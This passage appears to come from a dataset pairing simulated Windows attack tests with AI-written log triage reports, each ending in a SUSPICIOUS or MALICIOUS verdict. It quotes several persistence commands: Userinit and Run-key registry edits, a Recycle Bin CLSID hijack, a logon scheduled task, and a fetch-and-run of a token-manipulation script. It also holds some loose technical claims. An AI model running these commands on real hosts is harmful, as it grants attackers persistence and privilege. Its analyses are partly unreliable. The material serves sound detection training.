   - The PowerShell logs indicate a command that adjusts the registry key responsible for user initialization upon login: `Set-ItemProperty ""HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\"" ""Userinit"" ""Userinit.exe, C:\\Windows\\System32\\cmd.exe"" -Force`.
   - This command effectively schedules the `cmd.exe` to run upon user logon, which can be a common tactic used by malicious actors to ensure persistence on a compromised host.
   - Modifications to the `Userinit` registry key are often associated with malware or persistence mechanisms used by attackers.

2. **Sysmon Logs:**
   - The Sysmon logs show multiple executions of PowerShell, whoami.exe, conhost.exe, and MicrosoftEdgeUpdate processes.
   - The execution of `whoami.exe` can be typical for checking user privileges but should be contextualized with other activities.
   - The PowerShell command in the Sysmon log matches the suspicious registry editing command from the PowerShell logs, further flagging it as anomalous behavior.
   - The repeated instances of MicrosoftEdgeUpdate processes suggest potential software updating, which is typically benign unless modified or misused by malware.

3. **EdgeUpdate Entries:**
   - Application logs show services related to EdgeUpdate starting and stopping.
   - These updates, while typical system behavior for maintaining software, should be reviewed for tampering if executed alongside suspicious activities.

Based on the analysis of the logs:

- The PowerShell command manipulating registry values for persistence is a high indicator of potential malicious actions.
- While the EdgeUpdate processes might suggest normal operations, they could also be used as a cover for additional actions if any processes were compromised.

**Assessment:**
The logs indicate suspicious activity due to the registry modification via PowerShell, suggesting a likely attempt at persistent access or preparations for further malicious operations.

**Resolution:** SUSPICIOUS

**Guidance:**
1. Confirm unauthorized registry changes with system owner/administrator to verify future PowerShell activity and any script execution.
2. Investigate the integrity of the EdgeUpdate processes to evaluate if they were legitimate or tampered with.
3. Conduct a more thorough scan of the system for potential malware presence or malicious files.
4. Consider reverting the registry changes to prevent further unauthorized execution and ensure other persistence mechanisms are not in place.
5. Monitor the machine for unusual behaviors or additional suspicious activities in real-time, ensuring the security controls are functioning properly."
Service Installation PowerShell,"Based on the log entries provided, I've conducted a detailed analysis focusing on potential indicators of malicious activity. Here are the key findings:

### Suspicious or Anomalous Behavior:
1. **PowerShell Script Execution:**
   - There is an unusual execution of a PowerShell command that creates and starts a service named ""fileTestService_PowerShell"". The service points to an executable located in a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\fileService.exe`.
   - The use of PowerShell to create and start a service in a temp directory is suspicious because temp directories are often used for staging malware or unauthorized applications.

2. **Service Creation:**
   - The log indicates a new service (""fileTestService_PowerShell"") is created and set to auto-start with a binary path in an atypical location (temp directory), running as LocalSystem, which may be indicative of an attempt to establish persistence or escalate privileges.

3. **Sysmon Logs:**
   - Frequent use of system utilities like `wevtutil.exe` and `whoami.exe` in quick succession might imply reconnaissance activities to gather information about system configuration and logged-in users.
   - The execution of `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` aligns with the suspicious PowerShell activity captured in the PowerShell logs.

4. **Edge Update Activities:**
   - There are numerous entries related to the Microsoft Edge Update process and its components. These could be legitimate, but the timing coincides with the suspicious service creation, warranting further scrutiny.

### Indicators of Compromise:
- The PowerShell script used to install and start a service from a temporary path is highly suspicious and aligns with tactics used by malware to gain persistence.
- Execution of system utilities by `admin_test` user suggests internal reconnaissance efforts.

### Assessment:
Given the combination of PowerShell execution, the unusual service creation in a temporary directory, and subsequent execution patterns indicative of system reconnaissance, there is a strong basis to suspect malicious activity.

### Guidance on How to Proceed:
1. **Immediate Action:**
   - Disable the suspicious service ""fileTestService_PowerShell"" to prevent it from running.
   - Investigate the executable `fileService.exe` in the temporary directory for further analysis. Consider uploading to a sandbox or using a forensic tool to inspect for malware.

2. **Log Review:**
   - Conduct a comprehensive review of all logs to determine if there are missed indicators or extended activity.
   - Specifically, review security logs for any authentication logs or anomalies not present in the current set.

3. **User Verification:**
   - Verify the recent activities associated with the user account `admin_test` to check for unauthorized access.

4. **Network and Endpoint Monitoring:**
   - Increase monitoring on the affected system and network for any further suspicious activities.
   - Deploy network detection and response (NDR) tools to capture any outbound connections potentially related to data exfiltration.

### Resolution:
**MALICIOUS** - The logs contain evidence of malicious activity due to suspicious use of PowerShell to install and execute a new service from a temporary directory, coupled with patterns of typical reconnaissance behavior commonly associated with compromised hosts. Immediate containment and analysis are advised."
Remote Process Injection with Go using CreateRemoteThread WinAPI,"Upon reviewing the provided Windows event logs, several points of interest warrant a deeper analysis regarding suspicious or anomalous behavior:

### Suspicious and Anomalous Behavior
1. **Unusual Use of PowerShell and Process Injection:**
   - The PowerShell logs indicate that a command was executed involving both `werfault.exe` and `CreateRemoteThread.exe`. Specifically, the command started `werfault.exe` and then used `CreateRemoteThread.exe` to target the `pid` of the started process. This behavior is consistent with techniques used in process injection and could indicate an attempt to run malicious code within the context of another process.
  
2. **Elevation of Privileges with Specific Privileges Enabled:**
   - Security logs indicate that user `admin_test` logged in with high privileges (`SeDebugPrivilege`, among others). While this might be typical of an administrative user, the combination with the PowerShell activity noted above raises questions about the intent behind these actions.

3. **Time Manipulation Events:**
   - There are logs indicating time synchronization and manipulation around the same time as other suspicious activities. Such events can be benign in isolation (e.g., system time adjustments) but could also be used to manipulate log timings or to evade detections based on timestamps.

4. **Sysmon Records Various Legitimate System Tools Used:**
   - Several system utilities like `whoami.exe`, `conhost.exe`, and `wevtutil.exe` are executed by user `admin_test`. While some of these actions might be related to typical administrative tasks, given their correlation in timing with the process injection attempt, they deserve closer attention.

5. **Possible Attempt to Conceal Malicious Activity:**
   - The repeated execution of certain utilities could indicate attempts to survey the environment or alter configurations in preparation for malicious operations. Combined with the PowerShell activities, it seems there might be an effort to launch and obscure malicious activities.

### Assessment and Conclusion

Based on the analysis above, the combination of PowerShell usage aimed at process injection, elevation of non-standard privileges, time manipulation, and execution of diagnostic or utility tools suggests potentially malicious intent. The activities align with certain stages of a sophisticated attack, such as payload deployment and privilege escalation.

**Resolution: SUSPICIOUS**

### Recommendations for Proceeding
1. **Immediate Investigation:**
   - Investigate the origin of the PowerShell script and determine the purpose of the `CreateRemoteThread.exe` application located in the temporary directory.
   - Verify whether `admin_test` authorized these actions or if their credentials were potentially compromised.

2. **Containment Measures:**
   - If unauthorized, isolate the system to prevent potential data exfiltration or further propagation to additional network assets.
   - Conduct a comprehensive review of user access logs and cross-reference with this event set to pinpoint any unauthorized or anomalous logins.

3. **Forensic Analysis and Reverse Engineering:**
   - Capture system images for in-depth forensic analysis to identify any malware or persistence mechanisms.
   - Consider submitting suspicious binaries or scripts to a controlled environment or security vendor for reverse engineering.

By following through with these recommendations, the company can clarify whether there's an ongoing threat and take appropriate actions to safeguard its digital assets."
Parent PID Spoofing - Spawn from svchost.exe,"### Detailed Analysis

Upon analyzing the Windows event logs for Server002, several points of interest and potential anomalies were identified:

#### 1. **PowerShell Execution**
Multiple PowerShell events (EventID 600) demonstrate usage of PowerShell scripts with potentially suspicious command lines:
- A PowerShell session is initiated with a command to filter processes named 'svchost.exe' and execute in context using `Start-ATHProcessUnderSpecificParent`. This is particularly suspect as it modifies the usual process creation tree and interacts directly with the operating system at a process level.
- Command including `Start-Sleep` command might imply a technique to delay execution, commonly used to evade detections.
- Execution under **admin_test** user raises flags, suggesting an elevated context operation.

#### 2. **Windows System Logs**
- Windows updates seem normal and routine, although coming close in timestamps to the suspicious PowerShell activities.
- No anomalies presented in the update logs.
  
#### 3. **Security Logs**
- Multiple Security-Auditing logs with EventID 5379 show failures related to credential retrieval operations. This might suggest attempts at enumeration or a credential theft attempt.
- Logon EventID 4624 confirms SYSTEM level operations took place, possibly expected for some operations but warrants scrutiny given the context.
- EventID 4672 indicates a process receiving a set of privileges, including privileges generally reserved for sensitive operations (SeDebugPrivilege, SeBackupPrivilege, etc.), aligning with potential privilege escalation scenarios.

#### 4. **Sysmon Logs**
- Sysmon logs (EventID 1 and 5) show various processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `PowerShell` being executed frequently.
- Notable is several `powershell.exe` executions from directories used by **admin_test**, indicating attempted or successful execution of commands requiring administrative privileges or aiming at data exfiltration or lateral movement.
- Execution of substantiated tools such as `whoami.exe` and `hostname.exe` at centralized points might signify reconnaissance.

#### 5. **Final Assessment**
The combination of unusual PowerShell command execution, the direct manipulation of processes, and elevated-level security events indicating privilege increase or attempts to access account credentials necessitate detailed scrutiny:

1. **PowerShell Activities**: Utilize specific and complex command sequences indicating potential Administrator or SYSTEM level infiltration. Activities mimic tactics evident in malicious intrusions and lateral movement methods.
2. **Security Events with Elevated Privileges**: Suggestive of escalation and possible attempts at gaining administrative privileges or persistence within the system.
3. **Sysmon Process Creations**: Frequent low-level process startups hint at lateral movement or a staged intrusion with intrinsic system scout operations.
4. **Credential Retrieval Failures**: Insights into activities intended to leverage or brute force credentials, raising alert levels.

### Resolution and Recommendations
**Resolution: MALICIOUS**

Given the indicators of suspicious PowerShell execution patterns and privilege escalation tactics, the resolution is assessed as **MALICIOUS**. Immediate steps for mitigation and investigation should include:

- **Quarantine** the affected system to prevent further spread or compromise.
- Perform a **full forensic analysis** to identify the extent of the compromise, correlating timestamps, and user actions.
- Examine network traffic logs for any anomalous external connections or data exfiltration attempts.
- Ensure **EDR** solutions and related security mechanisms are alerted to these patterns for real-time detection.
- Conduct a thorough audit of user accounts, especially those with elevated privileges, to identify and remediate unauthorized access vectors.

This scenario demands an escalated and comprehensive security response to ensure containment and remediation."
WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique,"After analyzing the provided Windows event logs, I've found several points of interest indicating potential malicious activity:

1. **Time Change Events**:
   - EventID 4616 from the Security log shows changes in system time. Frequent and unexplained changes in system time can sometimes indicate malicious actions, such as an intruder trying to cover their tracks by altering timestamps of changes they made.

2. **Logon Events**:
   - The EventID 4624 indicates multiple successful logons using NTLM, which is not inherently malicious but paired with suspicious activity can indicate potential unauthorized access. The same user `admin_test` appears to have logged on numerous times using NTLM authentication from the workstation `DESKTOP-3HL5B2P`. The use of NTLM might indicate a less secure authentication method being leveraged.

3. **Privilege Escalation**:
   - EventID 4672 shows that the `admin_test` user was granted a variety of high-level privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. These are powerful privileges typically required for system-level manipulation and debugging tasks, which can be abused for malicious purposes.

4. **Suspicious PowerShell Activity**:
   - The Sysmon log shows execution of PowerShell (EventID 1) with a command that downloads and executes a script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1`. This script appears to be focused on token manipulation, which is a known technique for privilege escalation and maintaining persistence. Downloading and executing scripts from the web without verification is extremely suspicious and a common vector for malware execution.

5. **Security Software**:
   - Windows Defender is active (as indicated in the Application log), which is a positive point. However, it is unclear if it has detected or blocked any of the suspicious activities.

6. **Sysmon Events**:
   - Numerous `wevtutil.exe` and `conhost.exe` processes are spawned. While these are legitimate Windows processes, if they are not typically running with such frequency, their execution could be related to attempts to manipulate or view event logs (`wevtutil`) and potentially used to hide command shell activities (`conhost`).

### Assessment

Based on the analysis of these logs, I conclude that the activities recorded suggest a high likelihood of malicious attempts involving unauthorized access, privilege escalation, and execution of potentially harmful scripts. 

Resolution: **MALICIOUS**

### Guidance for Proceeding
- **Immediate Containment**: Isolate the affected machine (Server002) from the network to prevent further potential spread or data exfiltration.
- **Incident Response**: Engage your incident response team to investigate compromised accounts (`admin_test`) and determine the extent of unauthorized access.
- **Log Review & Monitoring**: Increase monitoring on event logs related to authentication, privilege use, and PowerShell execution, particularly for high-privilege accounts.
- **User Education**: Reinforce policies against executing unverified scripts and increase awareness about safe security practices among users with high-level privileges.
- **Patch & Update**: Ensure all systems, especially those involved, are fully patched and updated to mitigate potential abuse of known vulnerabilities.

These steps will help in mitigating the current threat and preventing similar incidents in the future."
Domain Password Policy Check: Common Password Use,"Upon reviewing the provided Sysmon, Windows PowerShell, and Security logs, several observations can be made regarding potential suspicious activity on the Windows host. Below is a detailed analysis:

### Suspicious or Anomalous Behavior:

1. **Repeated PowerShell Executions:**
   - Multiple instances of `powershell.exe` being executed under the user `SERVER002\\admin_test`. The command involves manipulating a credential file and setting an Active Directory account password. The usage of PowerShell scripts for credential storage and manipulation is a common technique in various types of attacks, including lateral movement and privilege escalation.
   - The PowerShell script tries to check for an existing password in a file and then attempts to set a new one if conditions are met. It is designed to handle errors and execute various actions based on condition checks, which is indicative of a potentially automated task or script for network account management or malicious purposes.

2. **Use of Wevtutil and Conhost:**
   - Wevtutil and conhost processes are executed sequentially multiple times. While these are legitimate Windows components, their usage can also be associated with attempts to clear logs (wevtutil) or manage command-line windows (conhost), which could be indicative of attempts to hide malicious activity.

3. **Credential File Interaction:**
   - The PowerShell script reads from and writes to a credential file in the local app data directory. Secure strings and potential passwords are manipulated, suggesting credential harvesting or manipulation, which poses a significant security risk.

4. **Edge Installer Executions:**
   - There are numerous executions related to Microsoft Edge installation processes (`setup.exe`). While these may be part of legitimate updates, it's essential to verify these activities against known update schedules and patterns for the network environment.

### Indicators of Malicious Activity or Compromise:

- The PowerShell behavior, particularly the automated handling of credentials and password setting, is highly suspicious, especially when not aligned with routine administrative tasks.
- The sequence of tool executions for handling credentials and potential log manipulation is consistent with techniques used in stealthy compromises aiming to harvest credentials or escalate privileges without detection.

### Assessment and Recommendation:

Based on the provided logs and analysis, there is strong evidence to suggest suspicious activity, potentially leaning towards malicious intent, given the execution of PowerShell scripts for credential manipulation and the possible clearing of event logs using `wevtutil`.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:

- **Immediate Investigation:** Conduct a thorough investigation to verify whether the observed scripts and processes align with legitimate administrative activities. Review user activities and permissions associated with `admin_test`.
- **Credential Audit and Reset:** Consider conducting a credential audit for accounts affected or accessed by the executed processes. Reset passwords and remove any unauthorized credential storage.
- **Log Monitoring and Retention:** Implement enhanced log monitoring and retention policies to prevent unauthorized log manipulation. Ensure Sysmon and Windows Event logs are regularly backed up.
- **Endpoint Security Review:** Assess and potentially improve endpoint security measures, such as applying more restrictive PowerShell execution policies and implementing behavioral monitoring for script-based attacks."
WMI Invoke-CimMethod Scheduled Task,"In reviewing the provided event logs, several key activities stand out that warrant further analysis due to their potential indicators of suspicious or malicious actions:

### Analysis:

1. **Time Manipulation (System and Security Logs):**
   - There are recurring entries indicating time changes (`EventID: 24` and `4616`) where the system time is set backwards within a very short span. The process responsible is `svchost.exe`. This behavior is unusual as arbitrary time changes might indicate attempts to evade time-based security controls or logs tampering.

2. **PowerShell Execution (Sysmon and Windows PowerShell Logs):**
   - PowerShell is executed (`Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) with a command to read an XML file (`data_005_WMI.xml`) and register a scheduled task using `Invoke-CimMethod`. The use of PowerShell to manipulate scheduled tasks can be a sign of persistence mechanisms being employed by an attacker. 
   - The monitoring of such PowerShell commands is essential due to their potential use in executing malicious payloads or maintaining long-term backdoor access.

3. **High-Level Privileges and Account Activity (Security Logs):**
   - The user `admin_test` was granted high-level privileges (`EventID: 4672`), which include `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, among others. This could indicate an unusual elevation of privileges which should be justified in a normal context, or might reflect an attacker moving laterally or attempting privilege escalation.
   - There were multiple logon sessions and command executions associated with this account shortly following the privilege escalation, including the use of `hostname.exe` and `whoami.exe`, typical reconnaissance actions.

4. **Event Logs and Conhost Activity (Sysmon Logs):**
   - The command-line activity of `wevtutil.exe` and `conhost.exe` logged multiple times under the `admin_test` user might indicate attempts to query, remove, or tamper with Windows Event Logs. This action is common in post-exploitation phases to cover tracks.

### Assessment:

The logs present several indicators of potentially malicious behavior:
- The time manipulation events could indicate attempts to circumvent logging mechanisms.
- The use of PowerShell for task scheduling and associated log manipulation tools resemble malicious activities intended to maintain persistence.
- The high-level privileges and pattern of account activity could suggest compromise or misuse of administrative credentials.

### Resolution:

Based on the outlined suspicious behavior, the resolution status of this analysis is determined as: **SUSPICIOUS** 

### Guidance:

1. **Immediate Investigation:**
   - Verify whether the time changes were authorized and determine the reason behind them.
   - Confirm if the PowerShell commands associated with scheduled task registration were legitimate maintenance activities or administrator-sanctioned scripts.
   - Check the legitimacy and need for `admin_test` to have the privileges that were escalated.

2. **Containment and Monitoring:**
   - Monitor future activity from the `admin_test` account and restrict any unnecessary high-level privileges.
   - Implement tighter monitoring of PowerShell scripts and configure logging to capture execution events and their resulting tasks.

3. **Conduct a Security Audit:**
   - Conduct a comprehensive audit on the host to identify any other signs of compromise or active persistence mechanisms.
   - Review and revise security policies related to privileged account usage and PowerShell script execution."
Azure AD - adding user to Azure AD role,"Based on the provided event logs, here's the detailed analysis:

### Analysis of PowerShell Logs
- **PowerShell Activity:** The logs show instances of PowerShell being executed with specific scripts that involve importing the AzureAD module and performing Azure Active Directory operations.
    - **Credential Object Creation:** The script includes creating a PSCredential object using a converted plain-text password (`p4sswd`) for user `jonh@contoso.com`. This approach is generally insecure as it exposes sensitive credentials within scripts.
    - **Role Assignment:** The script attempts to add a user identified as 'SuperUser' to a directory role 'Global Reader'. This may indicate privilege escalation attempts or unauthorized role changes.
    - **Write-Host and Warnings:** The script outputs messages about whether users and roles were found, and confirms the addition of the user to a role.

### Analysis of Sysmon Logs
- **Process Creation Events:** The Sysmon logs capture process creation events related to PowerShell activity.
    - **PowerShell Execution:** Processes were launched, specifically the `powershell.exe` process, originating from a path in a temporary directory, which may indicate suspicious activity if the script wasn't vetted by IT.
    - **Console Host and Command Execution:** Signals the PowerShell activity observed in the PowerShell logs, confirming execution with possible suspicious intent.
- **Other Processes:** Processes like `wevtutil.exe` and `conhost.exe` are noted, which are expected in normal operations but should be checked for anomalies if seen executing frequenctly or unusually.
- **System-level Processes:** System operations via `svchost.exe` were noted with NT AUTHORITY/SYSTEM, typical of regular system processes. However, these can sometimes be leveraged during attacks.

### Summary and Resolution
The execution of PowerShell scripts that include sensitive credential information and AzureAD role modifications suggests potential unauthorized actions, possibly from a compromised account or an insider threat. Normally, such activities should be conducted through more secure means and with justification documentation if legitimate.

#### Risks and Threats:
- **Potential Credential Exposure:** Storing and using plain-text passwords can lead to unauthorized access.
- **Unauthorized Privilege Escalation:** Modifying roles within AzureAD, especially adding users to privileged roles, is a red flag without an appropriate access request or record.
- **Indicators of Insider Threat or External Compromise:** The activities observed could suggest an insider threat trying to gain or distribute higher privileges, or an external actor using compromised credentials.

#### Guidance:
- **Immediate Investigation Required:** Verify the legitimacy of these activities directly with involved personnel (e.g., IT security head or the CEO).
- **Enhance Auditing and Controls:** Implement strict role/access change auditing, including alerts for immediate review when administrative roles are modified.
- **Security Policy Review:** Revise security policies to prevent insecure handling of credentials, emphasizing using secret stores or vaults.

### Final Resolution: **SUSPICIOUS**
The observed activity is suspicious and warrants further investigation to determine if it is a legitimate administrative operation or if it indicates potential malicious intent or compromise."
SystemBC Malware-as-a-Service Registry,"After reviewing the provided Windows event logs, I have identified several activities that stand out as potentially suspicious:

1. **PowerShell Activity**: The logs contain multiple PowerShell events with the command to modify the `Run` registry key to include a hidden PowerShell script. The command-line argument includes `-windowstyle hidden -ExecutionPolicy Bypass -File`, which is often associated with malicious scripts attempting to evade detection by running in a hidden mode. This behavior can be an indicator of PowerShell-based malware or a persistence mechanism used by attackers.

2. **Wevtutil and Conhost Execution**: There are instances of `wevtutil.exe` and `conhost.exe` being executed frequently by a test admin user. While `wevtutil.exe` is a legitimate Windows utility used for managing event logs and `conhost.exe` is associated with console windows, repeated execution, especially if unexpected, could be indicative of log tampering or other administrative tasks performed either unauthorized or unsanctioned.

3. **Edge Update Processes**: There are several executions of `MicrosoftEdgeUpdate.exe` and its related components. While these are legitimate processes and part of Microsoft Edge's update routine, their frequent activity aligns with the timestamp and could indicate either normal update behavior or, less likely but still possible, abuse for malicious intents. Without additional context or pattern of known issues, this could be considered benign unless corroborated by other suspicious indicators.

4. **TimeChange Events**: The logs also show a series of events related to time changes (`EventID: 4616` in the Security log). While not inherently malicious, time changes can be associated with attempts to bypass security measures that rely on time-based restrictions or event correlations.

**Assessment and Conclusion:**
- **PowerShell Usage**: The PowerShell event indicating persistence through the registry (`HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`) with a suspicious hidden execution policy bypass is a clear sign of potentially malicious activity aimed at maintaining persistence after reboot.

- **Wevtutil Executions**: The repeated use of `wevtutil.exe` by a test admin account needs further investigation to determine if these actions were legitimate maintenance tasks or something more nefarious, like log manipulation.

- **Resolution**: 
  Given the above findings, especially the PowerShell-based persistence mechanism, I would classify these logs as **MALICIOUS** due to the clear indicator of potential compromise. This assessment merits immediate investigation and response including:
  
  - Disabling the unauthorized registry changes and hidden PowerShell executions.
  - Conducting a thorough investigation of processes executed by the `admin_test` user.
  - Reviewing and validating all recent user activities and permission changes.
  - Performing a forensic analysis of the system to identify if additional compromises exist.
  - Raising awareness within the incident response team and preparing to contain any discovered threats.

Please take prompt remediation actions and consider involving the incident response team to further investigate and mitigate any associated risks."
Powershell Cmdlet Scheduled Task,"Upon reviewing the provided logs from the Windows host, there are several entries that involve suspicious behavior indicative of potential malicious activity:

### Analysis of Logs:

1. **Windows PowerShell Log:**
   - The entries show the execution of a PowerShell script used to schedule a task that executes `calc.exe` with high privileges. The command used is as follows:
     ```
     $Action = New-ScheduledTaskAction -Execute ""calc.exe""
     $Trigger = New-ScheduledTaskTrigger -AtLogon
     $User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest
     $Set = New-ScheduledTaskSettingsSet
     $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
     Register-ScheduledTask fileTask -InputObject $object
     ```
   - This is highly suspicious as it indicates unauthorized scheduling of a task with administrative privileges for a seemingly benign application (`calc.exe`). While `calc.exe` itself is not harmful, the method of execution and context suggests a potential attempt to test privilege escalation techniques or to mask a more nefarious payload.

2. **Sysmon Log:**
   - Multiple Sysmon events show process creation entries for `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe`, with the user context as `SERVER002\admin_test`. Wevtutil.exe is often used for querying and managing event logs, and its frequent invocation can suggest log tampering or reconnaissance.
   - The PowerShell process highlighted in the Sysmon logs matches the command observed in the PowerShell script log, further consolidating the malicious nature observed in the script execution.

3. **Microsoft Edge Update Entries:**
   - There are normal process creation entries related to Microsoft Edge updates, which appear benign and consistent with regular software update processes.
   
### Assessment:

- **Privilege Escalation and Persistence Mechanism:**
  The creation of a scheduled task using a PowerShell script to run with admin privileges is a significant red flag. This suggests an adversary attempting to maintain persistence on the host with elevated privileges, or at least conducting reconnaissance for further exploitation opportunities.

### Resolution:

- **MALICIOUS:**
  The logs contain clear evidence of potentially malicious activity. The attempted use of PowerShell for creating a scheduled task with high privileges is indicative of compromise. This activity requires immediate attention and remediation.

### Recommendations for Proceeding:

1. **Immediate Quarantine:**
   - Quarantine the affected system to prevent further potential spread or damage.

2. **Incident Response:**
   - Initiate a full incident response process, including deeper forensic analysis to determine the extent of the compromise and the intent behind these actions.
   
3. **Log Review and Cleanup:**
   - Review additional logs for any further indicators of compromise and ensure that any unauthorized entries or processes are removed.
   
4. **Scheduled Task Audit and Removal:**
   - Check for and remove any unauthorized scheduled tasks that have been created.

5. **User Permissions Audit:**
   - Review permissions for user accounts, especially `SERVER002\admin_test`, to ensure there are no unnecessary administrative privileges granted.

6. **Review Endpoint Detection and Response (EDR) Settings:**
   - Ensure EDR solutions are correctly configured to detect and alert on such behaviors in the future.

Given the findings, it is prudent to act swiftly to mitigate the identified risks and prevent any further compromise of the system."
Suspicious bat file run from startup Folder,"### Analysis:

Upon reviewing the provided Sysmon, Security, PowerShell, and System event logs, the following analysis has been completed:

#### Suspicious and Anomalous Behaviors:

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`:**
   - The Sysmon logs indicate multiple executions of `wevtutil.exe` and `conhost.exe` in rapid succession. While these processes are not inherently malicious, their repeated and rapid execution can sometimes indicate automated or scripted activity. This might be used to query or clear event logs as part of evasion techniques.

2. **PowerShell Script Activity:**
   - There are PowerShell event logs that capture a script being executed. The command involves copying a batch file `batstartup.bat` to multiple startup folders (`$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup` and `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp`) and then starting it. This behavior is consistent with persistence mechanisms often used in malware, attempting to ensure the payload executes on startup.

3. **Time Change Events:**
   - The Security and System logs reveal changes in system time (`EventID 4616` and others), which may indicate attempts to obscure log timelines or trigger specific tasks prematurely. Such changes can be a deliberate part of sophisticated attack techniques aimed at evasion or tampering with timestamped logs.

4. **High Integrity Level Processes:**
   - Several of the processes (`whoami.exe`, `hostname.exe`, `powershell.exe`) were executed with a high integrity level (`High`), indicating administrative privileges. While this can occur in many legitimate administrative scenarios, in combination with the other indicators, it raises concern for potential misuse of elevated permissions during an attack.

#### Indicators of Malicious Activity:

- **Persistence Mechanism Detected:** The PowerShell script attempting to place and execute a startup batch file is a significant indicator of potential malware trying to achieve persistence. The modification of startup folders as executed by an administrative account (`admin_test`) strongly suggests unauthorized changes aimed at persistence.

- **Time Manipulation:** The time adjustments on the system can disrupt chronological event understanding and might be aligned with malicious intents to cover tracks or synchronize specific malicious actions.

### Assessment:

Considering the activities observed in the logs, there are several red flags that merit concern, primarily the prominence of actions aligned with common attack methodologies (persistence and potential log tampering).

### Resolution:

- **Resolution: SUSPICIOUS**

The logs reveal activities that appear suspicious and warrant further investigation. The unusual repetition of certain system utilities, behavior indicative of persistence mechanisms through PowerShell scripts, and system time changes should be scrutinized more closely. It is crucial to verify whether the startup script is authorized and intended by the IT department or if further forensic analysis or live system investigation is warranted.

### Guidance:

1. **Immediate Steps:**
   - Confirm whether the changes to startup scripts were legitimate (e.g., part of IT administration work) with the involved personnel.
   - Check the integrity and content of `batstartup.bat` to ascertain it's not carrying a malicious payload.

2. **Further Investigation:**
   - Review additional logs and artifacts around the time related to Sysmon EventID 5 and the PowerShell logs to identify any associated activities.
   - Evaluate the network traffic from Server002 around these timestamps to check for suspicious data exfiltration or command-and-control communications.
   - Investigate the source of time change events for potentially unauthorized time-altering processes or user actions.

3. **Mitigation:**
   - Temporarily disable the affected user's startup items if the batch file is verified to be unauthorized.
   - Consider isolation of the affected system Server002 for detailed malware scanning, digital forensics, and remediation efforts.

These steps should help in further analyzing the situation and mitigating potential threats effectively."
Add persistance via Recycle bin,"### Detailed Analysis

#### Summary of Findings

Upon reviewing the provided logs, a series of unusual activities were observed on the Windows host `Server002`. The main points of interest highlight the use of Windows utilities and registry modifications. Key findings include:

1. **Use of `wevtutil.exe`**: This utility, typically used to manage event logs, was executed multiple times by a user identified as `SERVER002\admin_test`. While this is a legitimate Windows utility, repeated usage in quick succession can signal a suspicious activity if no legitimate maintenance is noted.

2. **Execution of `whoami.exe` and `hostname.exe`**: These are normal administration or troubleshooting commands, often used to gather system or user information. Not inherently malicious on their own, but contextual use could be of concern especially under high-integrity level execution.

3. **Command Execution via `cmd.exe`**: A particularly suspicious command was observed:
   ```
   cmd.exe /c reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f
   ```
   This command modifies the registry to set the open command of the system Recycle Bin to execute `calc.exe`, which is usually an indicator of an unauthorized change used for persistence or execution of arbitrary applications when triggered.

4. **Use of `reg.exe`**: The execution of `reg.exe` to modify registry keys for launching `calc.exe` upon certain triggers is decidedly suspicious and out of normal operating practices for critical user accounts, especially on an executive's machine.

5. **Microsoft Edge Update Activity**: Extensive legitimate Sysmon activity related to Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86.exe`) was noted. These processes appear to be performing updates and installations, typical for software maintenance.

#### Assessment of Threats and Risks

- **Registry Modifications**: The change in the registry to execute `calc.exe` is a known technique used by attackers to maintain persistence or execute payloads without direct visibility. It's a red flag that should be considered a severe compromise if not performed by known, authorized update scripts or user actions.

- **Execution Context**: The high-integrity level under which system commands and registry tools were executed adds a level of concern, suggesting that malicious actions have administrative privileges, amplifying potential impacts.

#### Recommended Actions

1. **Further Investigation**: Conduct a thorough investigation into the `SERVER002\admin_test` account's recent activities and logins. This should include verifying authorized registry changes and correlating them with known updates or administrative tasks.

2. **Audit Recent Changes**: Review system changes, particularly recent software updates or installations, to ensure they align with legitimate business needs.

3. **Update Security Policies**: As a preventive measure, ensure registry modifications and similarly critical system actions are logged and correlated with user intent through structured change management and approval processes.

4. **Perform System Scan**: Run a comprehensive malware and antivirus scan on affected machines to check for any latent threats.

### Final Resolution

Given the high-risk registry behavior observed (modifying `HKCR\CLSID`), the logs contain indicators that strongly suggest malicious activity.

**Resolution: MALICIOUS**"
Domain Password Policy Check: No Number in Password,"### Analysis of the Logs

#### Key Observations:

1. **Windows Update Client Logs (System Log):**
   - Numerous entries indicate Windows updates are being processed, such as updates for `Microsoft.VCLibs.140.00`, `MicrosoftWindows.CrossDevice`, `Microsoft.NET.Native.Runtime.2.2`, and others.
   - These operations are standard system updates and don't inherently suggest malicious activity.

2. **PowerShell Logs:**
   - Several instances of `PowerShell.exe` being executed with a script attempting to change passwords using a credential file.
   - The script checks for an existing password stored in a specific file and attempts to update it.

3. **Sysmon Logs:**
   - Multiple Sysmon Event ID `5`, indicating the process creation of known Windows executables like `powershell.exe`, `conhost.exe`, `wevtutil.exe`, `whoami.exe`, and `hostname.exe`, executed by user `SERVER002\admin_test`.
   - One Sysmon Event ID `1` shows the execution of `powershell.exe` with specific command lines related to credential and password management, which aligns with the PowerShell logs' password change script.
   - The same script attempts to change a password and stores the new password back into a file, raising suspicion if this is unauthorized user behavior.

4. **Application Logs:**
   - No suspicious activity is indicated. Normal Microsoft Software Protection Platform Service event.

#### Suspicious Indicators:
